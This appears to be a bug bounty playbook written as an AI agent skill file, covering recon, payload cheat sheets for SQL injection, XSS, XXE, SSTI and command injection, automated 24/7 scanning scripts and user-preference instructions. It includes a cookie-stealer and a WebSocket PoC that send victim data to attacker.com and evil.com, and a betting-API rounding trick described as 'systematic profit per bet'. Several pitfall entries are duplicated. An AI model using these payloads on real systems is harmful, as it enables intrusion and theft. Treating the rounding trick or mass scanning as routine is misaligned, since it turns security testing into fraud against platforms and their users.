
# Bug Bounty Playbook — V1 (Recon/Pre-Game) + V2 (Exploitation)

## 📋 V1 — PRE-GAME & RECON PHASE

### Infrastructure Setup
- **VPS**: DigitalOcean / AWS EC2 — for mass scanning & running tools 24/7
- **Local**: Laptop/desktop for manual testing via Burp Suite
- **Virtualization**: VirtualBox/VMware for lab environment to test exploits before hitting live targets

### Organization
| Tool | Use |
|:----:|:----:|
| **Notion** | Wiki, target tracker, notes, CVE watchlist |
| **OWASP Checklist** | Reference for all vulnerability classes to test |
| **Burp Suite Logs** | Save all traffic for later review |
| **Google Sheets** | Track targets, subdomains, findings, bounty amounts |

### Knowledge Base — CVE & Exploit Feeds
| Source | What to monitor |
|:------:|-----------------|
| **NIST NVD** | `nvd.nist.gov/vuln/search` — search by technology name |
| **Twitter** | Follow security researchers, #bugbounty, #CVE |
| **GitHub** | Watch for new PoCs, `github.com/topics/CVE-XXXX-XXXXX` |
| **ExploitDB** | `exploit-db.com` — search by software name |
| **Inoreader** | RSS feed aggregator for security blogs |
| **Reddit** | r/netsec, r/bugbounty |

### Recon Workflow
```
Domain → Subdomain Enum → CIDR Range → IP Scan → Web Apps → Tech Fingerprint
```
- **Domain**: Subfinder, Amass, Assetfinder
- **Subdomain takeover**: subjack, tko-subs
- **CIDR**: WHOIS, BGP lookup
- **IP scan**: masscan, nmap
- **Web apps**: httpx, httprobe
- **Tech fingerprint**: Wappalyzer, WhatWeb

### GitHub Recon Workflow
Search GitHub for: passwords, API keys, tokens, `.env`, `credentials`, `secret_key`, `aws_key`, connection strings
- **Tools**: truffleHog, gitrob

### Cloud Recon Workflow
Check for misconfigured: AWS S3 buckets, Azure Blob, Google Cloud Storage
- **Tools**: cloud_enum, s3scanner

### Google Dork Workflow
```
site:target.com ext:pdf | ext:doc | ext:xls | inurl:admin | inurl:wp-admin
site:target.com "password" | "confidential" | "internal"
site:target.com intitle:"index of" /etc | .git | .env | backup
```

### Leaked Credentials Workflow
- Check: Pastebin, Telegram channels, HaveIBeenPwned, DeHashed, IntelX
- Look for: company email domain → leaked passwords → test on target apps

### 1-Day / New CVE Workflow
1. Monitor Twitter/GitHub/ExploitDB for new CVE releases
2. Find PoC on GitHub (verify it's not fake!)
3. Mass scan all targets using nuclei / custom script
4. Exploit before patch window closes ⏱️

---

## 📖 V2 — EXPLOITATION PHASE

### 1. Known Vulnerabilities Pipeline
```
Target → Wappalyzer → Tech Stack + Version → Google/CVE/ExploitDB → PoC → Exploit
```
- **Wappalyzer**: browser plugin OR command-line (for batch scanning)
- **Check "Powered By"** in page footer — Wappalyzer doesn't catch everything
- **searchsploit**: CLI tool from ExploitDB — `searchsploit <technology name>`
- **CVE search**: `nvd.nist.gov` — always look for newest CVEs first
- **PoC sources**: GitHub (watch for FAKE PoCs!), ExploitDB

### 2. CMS Hacking

#### WordPress
| Tool | Command |
|:----:|---------|
| **wpscan** | `wpscan --URL <target>` |
| **Manual** | Check `/wp-content/uploads/` for directory listing |
| **Plugins** | Outdated plugins = RCE, SQLi, LFI |

#### Drupal
- **droopescan**: `python3 droopescan scan drupal -u <URL>`

#### Joomla
- **joomscan** or custom Joomla version fingerprint → search for CVEs

#### Adobe AEM (Experience Manager)
- Check: `/etc/clientlibs/`, `/content/dam/`, `/libs/granite/`

### 3. Subdomain Takeover
- Find CNAME records pointing to unclaimed services (AWS S3, GitHub Pages, Heroku, Azure, etc.)
- If the service doesn't exist → register it → takeover the subdomain
- **Impact**: full control over subdomain → phishing, cookie theft

### 4. Database Attacks

#### Firebase
- **Misconfig**: No auth on database → read/write all data
- Test: `https://<project>.firebaseio.com/.json`

#### ElasticSearch
- **Unauthenticated**: Default no auth on port 9200
- Dump all: `GET /_search` → `GET /_cat/indices` → `GET /<index>/_search`

#### MongoDB
- **Default**: No auth → connect with `mongo <host>:27017`
- Dump all: `show dbs` → `use <db>` → `db.getCollectionNames()` → `db.<col>.find()`

### 5. Brute Forcing

#### Login Pages
- **Default credentials**: admin/admin, admin/password, root/root
- **Common**: admin:admin, admin:password123, test:test, user:user
- Use Burp Intruder or ffuf with common credential wordlists

### 6. OWASP Deep Dive

#### SQL Injection (SQLi)
**MySQL:**
```sql
' ORDER BY 1--   -- find column count
' UNION SELECT NULL,NULL--  -- find text columns
' UNION SELECT NULL,table_name FROM information_schema.tables--  -- list tables
' UNION SELECT NULL,column_name FROM information_schema.columns WHERE table_name='users'-- 
' UNION SELECT NULL,concat(username,':',password) FROM users--  -- dump data
```

**PostgreSQL:**
```sql
' ORDER BY 1--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,table_name FROM information_schema.tables--
' UNION SELECT NULL,column_name FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT NULL,username||':'||password FROM users--
```

**Oracle:**
```sql
' UNION SELECT NULL,NULL FROM dual--
' UNION SELECT NULL,table_name FROM all_tables--
' UNION SELECT NULL,column_name FROM all_tab_columns WHERE table_name='USERS'--
```

**Tool**: sqlmap for automated exploitation

#### Cross-Site Scripting (XSS)
**Reflected XSS:**
```
<svg/onload=alert(1)>
<script>alert(1)</script>
<img src=x onerror=alert(1)>
"><script>alert(1)</script>
```

**Stored XSS**: Input stored in DB → executes when others view the page
- Test in: comments, profiles, posts, usernames

**DOM-based XSS**: Payload executes via JavaScript modifying DOM
- Sources: `location.search`, `location.hash`, `document.URL`
- Sinks: `innerHTML`, `document.write`, `eval()`

**SVG File Upload XSS** (often overlooked):
```xml
<?xml version="1.0" standalone="no"?>
<svg version="1.1" xmlns="http://www.w3.org/2000/svg">
  <rect width="300" height="100" style="fill:rgb(0,0,255)"/>
  <script type="text/javascript">alert(1)</script>
</svg>
```
Upload as profile pic → content-type `image/svg+xml` → triggers when viewed

**Cookie Stealer Payload:**
```javascript
<script>new Image().src='https://attacker.com/steal?c='+document.cookie</script>
```

#### File Upload
| Bypass Technique | Method |
|:-----------------|:-------|
| Content-Type | Change to `image/jpeg`, `image/png` |
| Extension | `.php5`, `.phtml`, `.phar`, `.php7`, `.shtml` |
| Double extension | `shell.php.jpg`, `shell.php;.jpg` |
| Null byte | `shell.php%00.jpg` |

#### Directory Traversal
```
../../../etc/passwd
../../../../windows/win.ini
....//....//....//etc/passwd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd
```

#### Open Redirect
```
?url=http://evil.com
?redirect=http://evil.com
?next=http://evil.com
?return=http://evil.com
?target=http://evil.com
```

#### IDOR (Insecure Direct Object Reference)
- Change numeric/guessable IDs in URL or POST body
- Example: `/api/user/1234` → change to `/api/user/1235` → access other user's data

### 7. API Testing

#### Authentication Types
| Type | Attack |
|:----:|--------|
| **HTTP Basic** | Base64 decode → brute force |
| **JWT** | None alg, RS→HMAC, brute secret, delete signature |
| **SAML** | XML Signature Wrapping (8 techniques), XML Comment injection |
| **API Keys** | Check for keys in URL, headers, or body |

#### JWT Attacks
**Delete Signature:**
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.
```
(Remove signature, keep the trailing dot)

**None Algorithm:**
```json
{"alg":"none","typ":"JWT"}
```
Change header to `alg: none` → empty signature

**RS256 → HS256 Confusion:**
- If server uses RS256 (asymmetric) but doesn't validate the public key
- Change algorithm to HS256 (symmetric) using the PUBLIC key as the HMAC secret

**Brute Force Secret:**
- `hashcat` or `john` with rockyou.txt against JWT signature

#### SAML Attacks
| Attack | Description |
|:-------|-------------|
| **XML Signature Removal** | Remove entire `<Signature>` element |
| **XML Comment Injection** | Inject `<!--` into values to break signature validation |
| **XSW 1** | Add extra document with different ID |
| **XSW 2** | Move Signature to wrapper document |
| **XSW 3-8** | Various XML restructuring techniques |

#### API Documentation Leaks
| Type | Endpoint |
|:----:|:---------|
| **Swagger** | `/api/docs`, `/swagger-ui.html`, `/api/swagger.json` |
| **Postman** | Postman documentation links exposed |
| **WSDL** | `?wsdl` for SOAP services |
| **WADL** | `?_wadl` for REST services |
| **GraphQL** | `/graphql?query={__schema{types{name}}}` — introspection |

### 8. Caching Server Attacks

#### Web Cache Poisoning
1. Find uncached parameter/header (X-Forwarded-Host, X-Host, etc.)
2. Inject malicious value that gets cached
3. All users visiting the cached page get the malicious response

#### Web Cache Deception
1. Request a static-looking URL: `/api/user/profile/test.css`
2. If cache sees `.css` → caches the response
3. Attacker shares the URL → victim's session data gets cached and leaked

### 9. Advanced OWASP

#### Server-Side Template Injection (SSTI)
| Engine | Detection Payload | RCE Payload |
|:------:|:-----------------:|:-----------:|
| **Jinja2 (Python)** | `{{7*7}}` | `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}` |
| **Tornado (Python)** | `{{7*7}}` | `{% import os %}{{os.popen('id').read()}}` |
| **ERB (Ruby)** | `<%=7*7%>` | `<%= system('id') %>` |
| **Slim (Ruby)** | `#{7*7}` | `#{system('id')}` |
| **Freemarker (Java)** | `${7*7}` | `<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}` |

#### XXE (XML External Entity)
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```
**Blind XXE** — out-of-band:
```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://attacker.com/data">
]>
```

**SSRF via XXE**:
```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
```

#### SSRF (Server-Side Request Forgery)
- Look for URL parameters: `?url=`, `?page=`, `?load=`, `?file=`, `?redirect=`
- Test: change to internal IPs: `http://127.0.0.1:8080/admin`, `http://10.0.0.1`
- **Cloud metadata**: `http://169.254.169.254/latest/meta-data/` (AWS)
- **GCP**: `http://metadata.google.internal/computeMetadata/v1/`
- **Azure**: `http://169.254.169.254/metadata/instance?api-version=2017-08-01`

#### CSRF (Cross-Site Request Forgery)
- Check for missing CSRF tokens in forms and API requests
- **PoC**: Create HTML form that auto-submits via JavaScript
```html
<form id="exploit" action="https://target.com/email/change" method="POST">
  <input name="email" value="attacker@evil.com">
</form>
<script>document.getElementById('exploit').submit()</script>
```
- Impact: change email → password reset → account takeover

#### Command Injection
| Char | Example | Notes |
|:----:|:--------|:------|
| `;` | `echo hi; echo bye` | Linux |
| `|` | `echo hi \| echo bye` | Both |
| `&&` | `echo hi && echo bye` | Only if first succeeds |
| `||` | `echo hi \|\| echo bye` | Only if first fails |
| `` ` `` | `` echo `id` `` | Backtick substitution (Linux) |
| `$()` | `echo $(id)` | Command substitution (Linux) |

**Blind detection**: Use `ping`, `curl`, or `nslookup` to call back to your server

#### Prototype Pollution (JavaScript)
```
?__proto__[isAdmin]=true
?constructor[prototype][isAdmin]=true
```
- Check for: `merge()`, `clone()`, `assign()` functions
- Impact: escalate privileges, bypass auth, XSS

#### CSP Bypass
| Technique | Description |
|:----------|:------------|
| **JSONP endpoints** | Use `?callback=alert(1)` on whitelisted JSONP endpoints |
| **Angular sandbox** | `{{constructor.constructor('alert(1)')()}}` |
| **CSP Injection** | Inject into policy: `; script-src 'unsafe-inline'` |
| **File upload** | Upload JS file to whitelisted CDN domain |

#### Cross-Site WebSocket Hijacking (CSWSH)
1. Application uses WebSocket for real-time features (chat, notifications)
2. WebSocket handshake uses cookies for auth (no CSRF protection)
3. Create PoC: user visits malicious page → JS creates WebSocket using victim's cookies
4. Full duplex: read and write messages as the victim

**POC:**
```javascript
var ws = new WebSocket('wss://target.com/chat');
ws.onopen = function() { ws.send('READ_MESSAGES'); };
ws.onmessage = function(evt) { fetch('https://evil.com/steal?data='+evt.data); };
```

---

## 🛠️ TOOLS REFERENCE

### Recon
| Tool | Purpose | Install |
|:----:|:--------|:--------|
| **subfinder** | Subdomain enum | `go install` |
| **amass** | Subdomain enum + ASN | `go install` |
| **httpx** | Probe live HTTP hosts | `go install` |
| **nuclei** | Vulnerability scanner | `go install` |
| **ffuf** | Directory/param fuzzing | `go install` |
| **gau/waybackurls** | URL discovery from Wayback | `go install` |
| **truffleHog** | GitHub secret scanning | `pip install` |
| **s3scanner** | S3 bucket enumeration | `go install` |

### Exploitation
| Tool | Purpose | Install |
|:----:|:--------|:--------|
| **Burp Suite** | Web proxy, repeater, intruder | Manual |
| **sqlmap** | Automated SQLi | `pip install` |
| **wpscan** | WordPress scanner | `gem install` |
| **searchsploit** | Offline ExploitDB | `git clone` |
| **hashcat** | Password cracking | `apt install` |
| **jwt_tool** | JWT attacks | `pip install` |
| **nuclei** | Template-based vuln scanner | `go install` |

### Wordlists
| Resource | Contents |
|:---------|:---------|
| **SecLists** | Everything — dirs, params, payloads, passwords |
| **PayloadsAllTheThings** | Comprehensive payloads by vuln type |
| **rockyou.txt** | Password wordlist |
| **Assetnote wordlists** | Directory/subdomain brute force |

---

## ⚡ BUG BOUNTY WORKFLOW

### For a new target:
```
1. RECON: subfinder → httpx → nuclei → waybackurls
2. TECH ID: wappalyzer → whatweb
3. CVE CHECK: searchsploit → NIST → GitHub
4. MANUAL: burp suite → test all endpoints
5. AUTH: JWT → SAML → OAuth → session
6. API: swagger → graphql introspection → parameter fuzzing
7. OWASP: SQLi → XSS → SSRF → SSTI → XXE → IDOR → CSRF
8. INFRA: subdomain takeover → cloud misconfig → open ports
9. REPORT: clear PoC → screenshots → impact → remediation
```

### For 1-day / new CVE:
```
1. MONITOR: Twitter, GitHub, ExploitDB, NIST
2. SCAN: nuclei + custom templates → mass scan all targets
3. EXPLOIT: verify with PoC on vulnerable targets
4. REPORT: submit immediately before patch
```

## 🤖 PIPELINE AUTOMATION (installable scripts)

This skill ships with executable pipeline scripts under `scripts/`. Deploy them to turn the playbook methodology into a **24/7 autonomous scanning system**.

### Quickstart

```bash
# 1. Setup dirs
mkdir -p ~/bug-bounty/{targets,recon,alerts}

# 2. Copy scripts from skill dir
cp -r <skill-dir>/scripts/* ~/bug-bounty/scripts/

# 3. Setup Telegram notification (REQUIRED for alerts)
#    Get bot token from @BotFather on Telegram, then:
bash ~/bug-bounty/scripts/setup-notify.sh <YOUR_BOT_TOKEN> <YOUR_CHAT_ID>

# 4. Add first target (auto-scans immediately)
bash ~/bug-bounty/scripts/add-target.sh target.com

# 5. Install cron for 24/7 scanning
bash ~/bug-bounty/scripts/setup-cron.sh
```

### Script Reference

| Script | Purpose |
|:-------|:--------|
| **`recon.sh`** | Main recon engine: subfinder → httpx → naabu → nuclei → waybackurls. Modes: `single`, `quick`, `list`, `nuclei-update` |
| **`add-target.sh`** | Add target to pipeline + immediate scan |
| **`setup-notify.sh`** | Configure Telegram bot for real-time CVE alerts |
| **`setup-cron.sh`** | Install cron jobs: quick scan every 30min, nuclei update daily at 06:00, full batch scan at 07:00 |

### Cron Schedule (default)

| Time | Job |
|:----:|:----|
| `*/30 * * * *` | Quick nuclei CVE scan on primary target |
| `0 */4 * * *` | Quick scan on secondary target |
| `0 6 * * *` | Update nuclei templates |
| `0 7 * * *` | Full batch scan all targets |

### CORS Misconfiguration Triage
`Access-Control-Allow-Origin: *` + `Access-Control-Allow-Credentials: true` on the OPTIONS preflight does NOT mean browser-exploitable. Browsers enforce the spec rule: TypeError thrown when ACAC=true and ACAO=*. Only report CORS as exploitable if: (a) actual POST response also reflects the wildcard ACAO header, OR (b) a browser-library test confirms data exfiltration. A preflight-only wildcard is informational at best.

### Network-Level Block Detection
When curl returns connection errors, distinguish the cause before reporting:
- **Cloudflare 403** — response body contains `Just a moment...` HTML. JS challenge needs a browser. CloakBrowser, Playwright, or valid cf_clearance cookie may bypass.
- **ISP TCP block** — `ERR_CONNECTION_CLOSED` or empty response. Connection reset at network layer. Nothing bypasses except VPN/proxy/Tor at the OS level. CloakBrowser cannot help.
- Test: `curl -sk <url>` — if you get HTML back = CF; if connection drops = ISP block.

### GraphQL Float Precision Exploit Pattern
On gambling/betting/gaming platforms, check the type of the `amount` parameter in betting mutations:
- `Float!` = IEEE 754 double precision (~15 digits) — **exploitable for rounding**
- `BigDecimal` / `String` = no precision issue
- Test: bet `0.10000000000000001` (just above 0.1), check if server rounds down to 0.1 internally but charges full value. Systematic profit per bet.

### Kali SSH Banner Workaround
If Kali's SSH MOTD banner prepends to binary data, SCP fails with "Received message too long". Reliable transfer:
```
base64 -w0 local_file | ssh -i key user@host "base64 -d > remote_file"
```
Reverse:
```
ssh -i key user@host "base64 -w0 remote_file" | base64 -d > local_file
```

### Source Extraction from Encoded Repos
Community repo auth modules are often obfuscated `.pyc` (base64 bytecode). Skip them — focus on readable `.py` files (`client.py`, `endpoints.py`, query builders). Extract all GraphQL operations: `grep -rEn '(query|mutation|subscription)\s+\w+' <dir> --include="*.py"`

### Admin Path fuzzing
Confirmed admin paths return 403 (not 404) = endpoint exists. Only report as finding if you find an auth bypass or information leak. 403-by-default is not a vulnerability.

### Aggressive Mindset (user preference — direct, no fluff)

When executing bug bounty tasks for this user:
- **Speed over perfection** — first report > perfect report. Skip verbose explanations.
- **Automation first** — manual is too slow. Use nuclei, subfinder, notify at scale.
- **1-day hunting** — monitor CVE feeds continuously. When a new PoC drops, mass-scan immediately.
- **Chaining** — combine low-severity findings (IDOR+CSRF, SSRF+XSS) into critical-impact reports.
- **Direct delivery** — deliver findings as: vulnerability class → PoC → impact. No theory, no tool tutorials, no fluff.

---

## ⚠️ PITFALLS
- **Fake PoCs on GitHub** — always test in lab before running on live target
- **Wappalyzer misses some tech** — check "Powered By" / HTML comments / JS file names
- **SQLi error doesn't always show** — use time-based blind detection
- **XSS doesn't need `<script>`** — try SVG, onerror, onload, iframe, meta refresh
- **SSRF impact** — hardest part is finding what to access (metadata service is default)
- **JWT none algorithm** — only works if server has `none` in accepted algorithms list
- **Burp Community** throttles Intruder — use ffuf for speed
- **Always check scope before testing** — out-of-scope = ban
- **nuclei -update-templates can timeout** on slow networks. Retry or run `GIT_TERMINAL_PROMPT=0` manually.
- **Pipeline scripts need Go tools in PATH** — ensure `~/go/bin` is in your shell config.
- **LLM is weak at SQLi/XSS/RCE/SSRF escalation** — use specialized tools (SQLMap, XSStrike, SSRFMap). See `references/llm-assisted-hunting.md`.
- **Self-hosted programs have less competition** — focus on independent programs for faster payouts. See `references/self-hosted-programs.md`.
- **PostHog project keys are LOW severity** — can send events but NOT read data. Don't over-report. See `references/recon-findings-july-2026.md`.
- **SPA routing returns same HTML for all paths** — NOT a vulnerability. Check content-type (text/html = SPA, application/json = real API).
- **Kong API gateway fingerprints** — returns `{"message":"no Route matched..."}` for unmatched routes. Use for tech fingerprinting.
- **Webflow hidden pages** — `/hidden-pages/*` accessible = Informational only (no sensitive data).
- **Auth0 OAuth2 returning 401 is proper behavior** — don't report as "auth bypass". Token endpoint requires valid credentials.
- **Float type in betting APIs = exploitable precision bug** — `Float!` for bet amounts cannot represent all decimal values. Test by betting `0.10000000000000001` (>0.1) and checking if server rounds down to 0.1 internally, pocketing the diff per bet. Systematic profit on every wager.
- **CORS wildcard preflight ≠ exploitable** — browsers block `ACAO:*, ACAC:true` combo before POST is sent. Verify actual POST response headers or use browser-library test.
- **ISP blocks vs CF blocks** — CF sends HTML ("Just a moment..."), ISP sends connection reset. CloakBrowser only helps against CF, not ISP-level TCP blocks.
- **"No drain found" is NOT a stopping point for this user**, read ALL instruction files that move funds, not just top-level. Many LSD protocols have no direct drain at first, but unchecked arithmetic cascades or virtual/real balance drift can lead to High-severity findings.
- **LSD drain audit must be exhaustive**: check Mint path, Burn path, Reserve CPI, liq_pool, Delayed Unstake, Emergency paths, Upgrade state machine, Virtual vs Real balance drift, and Reward Crank. See `solana-smart-contract-audit/references/lsd-drain-audit-reference.md` for the full checklist.
- **Always offer the pivot to user**: after deep drain audit, give clear binary choice — submit current findings vs switch to a different target with higher drain potential. Don't imply "this is the only option."
- **JSON-RPC API fuzzing** — Try `rpc.listMethods`, `rpc_modules`, `eth_accounts`, `eth_blockNumber` to enumerate available methods. Error code -32601 = method doesn't exist.
- **RPC services (BlockPI, Alchemy) don't hold user funds** — no fund theft potential. Target actual DeFi protocols (lending, bridge, DEX) for Critical severity.
- **EMAIL-DIRECT BUG BOUNTIES = WASTE OF TIME** — programs that say "report to security@vendor.com" with no escrow, no published payout, no triage SLA: skip them. The PoC you send often gets stolen or acknowledged-then-ignored. **Only hunt on programs with verifiable escrow**: Immunefi, Cantina, Hats, Code4rena, Code4rena-style competitions, Sherpa/Recon-style managed services, or vendor-hosted HackerOne/Bugcrowd programs with a public "Rewards" table. If the program doesn't publish Critical/High dollar amounts and a public triage SLA, it's not a paying program — it's a free disclosure inbox. See `references/escrow-platform-priority-aug-2026.md`.
- **The 1,655-findings trap** — popular escrow programs (Morpho: 1,655; Lombard: 165; Pendle: 80+; Ethena: 70+) have been heavily audited. Quick solo audit almost never finds a fresh Critical. **Pivot to programs with < 100 findings** that are still on escrow: Ondo Perps (77), RedStone (newer), Kiln, Midas, any protocol that just launched a V2 within last 6 months. The "newer + V2" combo is the realistic critical-finding window.
- **VPS 2GB + Foundry full IR build = minutes-per-build or OOM** — if the target is a Hardhat/Foundry SC project, the default `forge build` with `via_ir=true` will eat 2-4 GB RAM and 60-300s. Before going to disk for IR build: (a) `git submodule update --init --depth 1` first; (b) if no `via_ir` needed, try `forge build --no-via-ir` or delete `via_ir=true` from foundry.toml; (c) for `mulDiv`/accounting review, you do NOT need a full build — `solc --bin src/Foo.sol` works for single-file compile, and Slither per-file with proper remaps works without compiling the whole repo.
- **RPC services (BlockPI, Alchemy) don't hold user funds** — no fund theft potential. Target actual DeFi protocols (lending, bridge, DEX) for Critical severity.
- **SPA routing returns same HTML for all paths** — NOT a vulnerability. Check content-type (text/html = SPA, application/json = real API).
- **Kong API gateway fingerprints** — returns `{"message":"no Route matched..."}` for unmatched routes. Use for tech fingerprinting.
- **Webflow hidden pages** — `/hidden-pages/*` accessible = Informational only (no sensitive data).
- **Auth0 OAuth2 returning 401 is proper behavior** — don't report as "auth bypass". Token endpoint requires valid credentials.

## 📚 REFERENCE FILES
- **`references/llm-assisted-hunting.md`** — LLM-specific bug bounty methodology (Reddit hunter, 60+ bugs, compaction survival block, bug class priority)
- **`references/self-hosted-programs.md`** — Self-hosted bug bounty programs list (36 programs with contacts, bounty ranges, recon results)
- **`references/recon-findings-july-2026.md`** — Live recon findings: PostHog API key exposure, Webflow hidden pages, Kong fingerprinting, SPA routing, Auth0 OAuth2 assessment
- **`references/bug-bounty-workflow-july-2026.md`** — Comprehensive bug bounty workflow: CLAUDE.md setup, compaction survival block, MCP configuration, daily/weekly/monthly workflow, expected earnings
- **`references/escrow-platform-priority-aug-2026.md`** — Escrow platform triage: Cantina/Immunefi/Hats/Code4rena priority list with findings-count heuristic, "is it worth my time" decision tree, live program snapshot